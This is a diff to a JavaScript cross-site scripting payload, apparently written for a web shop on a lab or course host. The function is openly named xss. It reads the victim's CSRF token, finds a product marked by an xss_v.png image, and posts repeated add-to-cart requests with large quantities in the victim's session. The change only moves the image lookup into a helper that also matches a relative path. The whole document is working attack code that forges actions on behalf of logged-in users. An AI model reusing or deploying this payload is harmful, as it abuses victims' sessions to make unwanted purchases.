@@ -1,5 +1,10 @@
 const AMOUNT = [10000, 1000, 100, 10]
 
+function get_virus_img(d) {
+    let virus = d.querySelector("img[src='https://isp.dc-yan.top/media/product_thumbnails/xss_v.png']");
+    return virus ? virus : d.querySelector("img[src='/media/product_thumbnails/xss_v.png']");
+}
+
 function xss(i=0) {
     if (i === AMOUNT.length) return;
     try {
@@ -24,7 +29,7 @@ function xss(i=0) {
                 cart_form.set("csrfmiddlewaretoken", csrftoken);
                 cart_form.set("quantity", amount);
 
-                let virus = doc.querySelector("img[src='https://isp.dc-yan.top/media/product_thumbnails/xss_v.png']");
+                let virus = get_virus_img(doc);
 
                 if (virus) {
                     virus = virus.parentElement.parentElement;
@@ -43,7 +48,7 @@ function xss(i=0) {
                     ).then(html => {
                         const parser = new DOMParser();
                         const doc = parser.parseFromString(html, "text/html");
-                        return doc.querySelector("img[src='https://isp.dc-yan.top/media/product_thumbnails/xss_v.png']").parentElement.parentElement;
+                        return get_virus_img(doc).parentElement.parentElement;
                     })
                 }
             }
